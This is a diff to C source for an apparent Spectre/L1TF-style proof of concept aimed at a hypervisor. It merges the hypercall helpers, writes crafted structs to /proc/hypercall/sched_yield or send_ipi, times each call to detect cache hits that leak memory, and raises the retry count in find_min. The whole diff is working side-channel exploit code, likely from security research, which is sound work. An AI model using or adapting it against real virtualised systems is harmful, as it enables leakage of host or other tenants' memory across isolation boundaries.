@@ -18,38 +18,6 @@
 #include "l1tf.h"
 #include "time_deque.h"
 
-int hypercall_yield(void *raw_opts) {
-  struct sched_yield_hypercall *opts = raw_opts;
-  const char *hypercall_path = "/proc/hypercall/sched_yield";
-  int fd = open(hypercall_path, O_WRONLY);
-  if (fd < 0) {
-    err(fd, "Failed to open %s", hypercall_path);
-  }
-
-  int b = write(fd, opts, sizeof(*opts));
-  close(fd);
-  if (b < 0) {
-    err(errno, "Failed to write to %s", hypercall_path);
-  }
-  return b;
-}
-
-int hypercall_ipi(void *raw_opts) {
-  struct send_ipi_hypercall *opts = raw_opts;
-  const char *hypercall_path = "/proc/hypercall/send_ipi";
-  int fd = open(hypercall_path, O_WRONLY);
-  if (fd < 0) {
-    err(fd, "Failed to open %s", hypercall_path);
-  }
-
-  int b = write(fd, opts, sizeof(*opts));
-  close(fd);
-  if (b < 0) {
-    err(errno, "Failed to write to %s", hypercall_path);
-  }
-  return b;
-}
-
 size_t calculate_min(const uintptr_t phys_page_addr, const uintptr_t phys_map_addr) {
   // It is below the phys_map, and thus unreachable
   if (phys_page_addr < phys_map_addr) {
@@ -65,24 +33,22 @@ enum half_spectre_method {
 };
 static const enum half_spectre_method method = METHOD_YIELD;
 
+#define HYPERCALL_PATH_SIZE 127
 size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iters) {
   unsigned int cpu = 0;
   struct send_ipi_hypercall opts_ipi;
   struct sched_yield_hypercall opts_yield;
-  void *opts_ptr;
-  int (*hypercall)(void *opts);
+  char hypercall_path[HYPERCALL_PATH_SIZE + 1] = {0};
 
   switch (method) {
   case METHOD_YIELD:
     if (getcpu(&cpu, NULL) == -1) {
       err(EXIT_FAILURE, "Failed to get CPU");
     }
-
     opts_yield.current_cpu_id = cpu;
     opts_yield.speculated_cpu_id = idx;
     opts_yield.ptr = buf;
-    opts_ptr = &opts_yield;
-    hypercall = &hypercall_yield;
+    strncpy(hypercall_path, "/proc/hypercall/sched_yield", HYPERCALL_PATH_SIZE);
     break;
   case METHOD_IPI:
     opts_ipi.real.mask_low = -1;
@@ -93,21 +59,41 @@ size_t access_buffer_with_spectre(void *buf, const size_t idx, const size_t iter
     opts_ipi.mispredicted.min = idx;
     opts_ipi.ptr = buf;
 
-    opts_ptr = &opts_ipi;
-    hypercall = &hypercall_ipi;
+    strncpy(hypercall_path, "/proc/hypercall/send_ipi", HYPERCALL_PATH_SIZE);
     break;
   default:
     err(EXIT_FAILURE, "Unknown method type");
   }
 
-  size_t min = -1;
+  int fd = open(hypercall_path, O_WRONLY);
+  if (fd < 0) {
+    err(fd, "Failed to open %s", hypercall_path);
+  }
+
+  ssize_t min = 10000000000;
   for (size_t i = 0; i < iters; ++i) {
-    size_t time = hypercall(opts_ptr);
+    ssize_t time = 0;
+    switch (method) {
+    case METHOD_YIELD:
+      time = write(fd, &opts_yield, sizeof(opts_yield));
+      break;
+    case METHOD_IPI:
+      time = write(fd, &opts_ipi, sizeof(opts_ipi));
+      break;
+    default:
+      break;
+    }
+
+    if (time < 0) {
+      err(errno, "Failed to write to %s", hypercall_path);
+    }
     if (time < CACHE_HIT_THRESHOLD) {
       return time;
     }
     min = time < min ? time : min;
   }
+
+  close(fd);
 
   return min;
 }
@@ -152,7 +138,7 @@ size_t find_min(void *buf) {
 
         size_t time = access_buffer_with_spectre(buf, idx, 1);
         if (time < 220) {
-          time = access_buffer_with_spectre(buf, idx, 1000);
+          time = access_buffer_with_spectre(buf, idx, 10000);
           if (time < CACHE_HIT_THRESHOLD) {
             printf("\nhit: %lx %ld\n", idx, time);
             return idx;
